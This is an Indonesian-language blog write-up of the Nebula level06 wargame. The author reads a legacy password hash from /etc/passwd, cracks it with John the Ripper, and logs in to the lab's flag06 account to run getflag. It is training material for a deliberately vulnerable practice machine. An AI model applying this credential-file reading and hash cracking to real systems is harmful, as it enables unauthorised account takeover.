+++
author = "kernel-panic"
categories = ["Security", "Nebula"]
date = "2018-01-19T11:57:00+00:00"
description = "Security Wargames"
featured = "7r8KfsEZ_o.jpg"
featuredalt = "Nebula Level06"
featuredpath = "https://images2.imgbox.com/5b/95"
linktitle = ""
title = "Exploit Exercises - Nebula Level06"
type = "post"

+++
Dalam bagian tentang {{< url-link "level06" "https://exploit-exercises.com/nebula/level06/" "target">}} memberitahu bahwa "kredensial akun flag06 berasal dari sistem unix lawas."

Saya percaya petunjuk itu menjelaskan secara persis apa yang kita butuhkan untuk memecahkan level ini.

Sistem unix lawas menyimpan hash password di /etc/passwd yang world-readable, sedangkan dalam sistem modern menggunakan file shadow untuk menyimpan informasi sensitif ini.

Untuk memecahkan apakah dugaan saya benar atau salah, saya pun menggunakan perintah grep untuk mengkonfirmasinya.

        level06@nebula:~$ grep flag06 /etc/passwd
        flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh

Dan kita bisa melihat baris untuk akun flag06 berisi hash kata sandi dan bukan 'x' yang akan  ditampilkan pada sistem modern dengan memanfaatkan /etc/shadow.

Lalu, kita bisa menggunakan _John the Ripper_ untuk memecahkan hash tersebut.

    root@kernel-panic:~# john flag06.txt --show
    flag06:hello:993:993::/home/flag06:/bin/sh
    
    1 password hash cracked, 0 left

John dengan cepat mengidentifikasi kata sandinya adalah 'hello'. Mari kita coba:

        level06@nebula:~$ ssh flag06@localhost
        The authenticity of host 'localhost (127.0.0.1)' can't be established.
        RSA key fingerprint is 67:fe:f4:09:cd:0f:ba:dd:87:2b:73:2c:80:31:c2:68.
        Are you sure you want to continue connecting (yes/no)? yes
        Warning: Permanently added 'localhost' (RSA) to the list of known hosts.
    
            _   __     __          __
           / | / /__  / /_  __  __/ /___ _
          /  |/ / _ \/ __ \/ / / / / __ `/
         / /|  /  __/ /_/ / /_/ / / /_/ /
        /_/ |_/\___/_.___/\__,_/_/\__,_/
    
        exploit-exercises.com/nebula
    
    
        For level descriptions, please see the above URL.
    
        To log in, use the username of "levelXX" and password "levelXX", where
        XX is the level number.
    
        There are currently 20 levels (00 - 19).
    
    
    
        flag06@localhost's password:
        Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
    
        * Documentation:  https://help.ubuntu.com/
        New release '12.04 LTS' available.
        Run 'do-release-upgrade' to upgrade to it.
    
    
        The programs included with the Ubuntu system are free software;
        the exact distribution terms for each program are described in the
        individual files in /usr/share/doc/*/copyright.
    
        Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
        applicable law.
    
        flag06@nebula:~$ getflag
        You have successfully executed getflag on a target account

Kata sandi tersebut cocok dan saya berhasil masuk ke akun flag06 dan menjalankan getflag.

<div class="videoyoutube"><div class="video-responsive"><iframe allowfullscreen="1" class="embedded-video-large" src="https://www.youtube.com/embed/31EF657-8aE?rel=0"></iframe></div></div>